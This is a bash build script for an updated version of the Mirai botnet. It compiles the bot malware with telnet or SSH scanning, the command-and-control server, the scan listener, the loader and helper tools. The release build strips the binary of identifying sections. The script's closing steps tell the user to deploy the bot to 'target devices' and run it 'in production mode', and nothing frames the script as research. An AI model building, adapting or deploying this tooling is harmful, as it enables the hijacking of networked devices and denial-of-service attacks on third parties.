#!/bin/bash

# Modern Mirai Build Script
# Simplified and improved version of the original build.sh

set -e  # Exit on error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Functions for colored output
info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check dependencies
check_dependencies() {
    info "Checking dependencies..."
    
    local missing_deps=()
    
    if ! command -v gcc &> /dev/null; then
        missing_deps+=("gcc")
    fi
    
    if ! command -v go &> /dev/null; then
        missing_deps+=("golang")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        error "Missing dependencies: ${missing_deps[*]}"
        info "Install with: sudo apt-get install -y gcc golang"
        exit 1
    fi
    
    success "All dependencies found"
}

# Show usage
show_usage() {
    cat << EOF
${GREEN}Mirai Modern Build Script${NC}

${BLUE}Usage:${NC}
    $0 [OPTIONS]

${BLUE}Options:${NC}
    -h, --help              Show this help message
    -m, --mode MODE         Build mode: debug or release (default: debug)
    -t, --type TYPE         Build type: telnet or ssh (default: telnet)
    -c, --component COMP    Component to build: all, bot, cnc, tools, loader (default: all)
    -v, --verbose           Verbose output
    --clean                 Clean build directories before building

${BLUE}Examples:${NC}
    $0                              # Build everything in debug mode with telnet
    $0 --mode debug --type telnet   # Same as above
    $0 --mode release --type ssh    # Build release with SSH
    $0 --component cnc              # Build only CNC
    $0 --clean --mode debug         # Clean and build debug
    
${BLUE}Components:${NC}
    all     - CNC, Bot, Tools, Loader
    bot     - Bot malware only
    cnc     - Command & Control server only
    tools   - Utility tools (enc, scanListen, etc.)
    loader  - Loader only

${BLUE}Build Modes:${NC}
    debug   - Debug builds with symbols, verbose output, testing tools
    release - Optimized, stripped binaries for production

${BLUE}Types:${NC}
    telnet  - Use telnet scanning
    ssh     - Use SSH scanning

EOF
}

# Parse command line arguments
MODE="debug"
TYPE="telnet"
COMPONENT="all"
VERBOSE=false
CLEAN=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_usage
            exit 0
            ;;
        -m|--mode)
            MODE="$2"
            shift 2
            ;;
        -t|--type)
            TYPE="$2"
            shift 2
            ;;
        -c|--component)
            COMPONENT="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        --clean)
            CLEAN=true
            shift
            ;;
        *)
            error "Unknown option: $1"
            show_usage
            exit 1
            ;;
    esac
done

# Validate arguments
if [[ "$MODE" != "debug" && "$MODE" != "release" ]]; then
    error "Invalid mode: $MODE (must be 'debug' or 'release')"
    exit 1
fi

if [[ "$TYPE" != "telnet" && "$TYPE" != "ssh" ]]; then
    error "Invalid type: $TYPE (must be 'telnet' or 'ssh')"
    exit 1
fi

if [[ "$COMPONENT" != "all" && "$COMPONENT" != "bot" && "$COMPONENT" != "cnc" && "$COMPONENT" != "tools" && "$COMPONENT" != "loader" ]]; then
    error "Invalid component: $COMPONENT"
    exit 1
fi

# Set build flags
FLAGS=""
if [ "$TYPE" == "telnet" ]; then
    FLAGS="-DMIRAI_TELNET"
elif [ "$TYPE" == "ssh" ]; then
    FLAGS="-DMIRAI_SSH"
fi

# Get script directory
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$SCRIPT_DIR"

# Clean if requested
if [ "$CLEAN" = true ]; then
    info "Cleaning build directories..."
    rm -rf debug release
    success "Clean complete"
fi

# Create directories
mkdir -p debug release

info "Build Configuration:"
info "  Mode: $MODE"
info "  Type: $TYPE"
info "  Component: $COMPONENT"
info "  Flags: $FLAGS"

# Build tools (needed for configuration)
build_tools() {
    info "Building tools..."
    gcc -std=c99 tools/enc.c -g -o debug/enc
    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
    gcc -std=c99 tools/badbot.c -g -o debug/badbot
    success "Tools built: debug/enc, debug/nogdb, debug/badbot"
}

# Build CNC
build_cnc() {
    info "Building CNC server..."
    if [ "$MODE" == "debug" ]; then
        go build -o debug/cnc cnc/*.go
        success "CNC built: debug/cnc"
    else
        go build -o release/cnc cnc/*.go
        success "CNC built: release/cnc"
    fi
}

# Build scanListen
build_scanlisten() {
    info "Building scanListen..."
    if [ "$MODE" == "debug" ]; then
        go build -o debug/scanListen tools/scanListen.go
        success "scanListen built: debug/scanListen"
    else
        go build -o release/scanListen tools/scanListen.go
        success "scanListen built: release/scanListen"
    fi
}

# Build bot (debug)
build_bot_debug() {
    info "Building bot (debug mode for x86)..."
    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
    success "Bot built: debug/mirai.dbg"
}

# Build bot (release) - only x86 for now
build_bot_release() {
    info "Building bot (release mode for x86)..."
    if command -v i586-gcc &> /dev/null; then
        i586-gcc -std=c99 $FLAGS bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/mirai.x86 -DMIRAI_BOT_ARCH=\"i586\" -DKILLER_REBIND_SSH -static
        i586-strip release/mirai.x86 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
        success "Bot built: release/mirai.x86"
    else
        warning "Cross-compiler i586-gcc not found, using native gcc"
        gcc -std=c99 $FLAGS bot/*.c -O3 -static -o release/mirai.x86 -DMIRAI_BOT_ARCH=\"native\"
        strip release/mirai.x86
        success "Bot built: release/mirai.x86 (native)"
    fi
}

# Build based on component
case "$COMPONENT" in
    all)
        check_dependencies
        build_tools
        build_cnc
        build_scanlisten
        if [ "$MODE" == "debug" ]; then
            build_bot_debug
        else
            build_bot_release
        fi
        ;;
    bot)
        check_dependencies
        if [ "$MODE" == "debug" ]; then
            build_bot_debug
        else
            build_bot_release
        fi
        ;;
    cnc)
        check_dependencies
        build_cnc
        ;;
    tools)
        check_dependencies
        build_tools
        build_scanlisten
        ;;
    loader)
        if [ -d "../loader" ]; then
            info "Building loader..."
            cd ../loader
            ./build.sh
            success "Loader built in ../loader"
        else
            error "Loader directory not found"
            exit 1
        fi
        ;;
esac

info ""
success "Build complete!"
info ""
info "Next steps:"
if [ "$MODE" == "debug" ]; then
    info "  1. Configure database: sudo mysql < ../scripts/db.sql"
    info "  2. Update CNC config: nano cnc/main.go"
    info "  3. Run CNC: ./debug/cnc"
    info "  4. Connect: telnet localhost 23 (admin/password123)"
    info "  5. Test bot: ./debug/mirai.dbg"
else
    info "  1. Deploy release/cnc to your server"
    info "  2. Deploy release/mirai.x86 to target devices"
    info "  3. Run in production mode"
fi
info ""
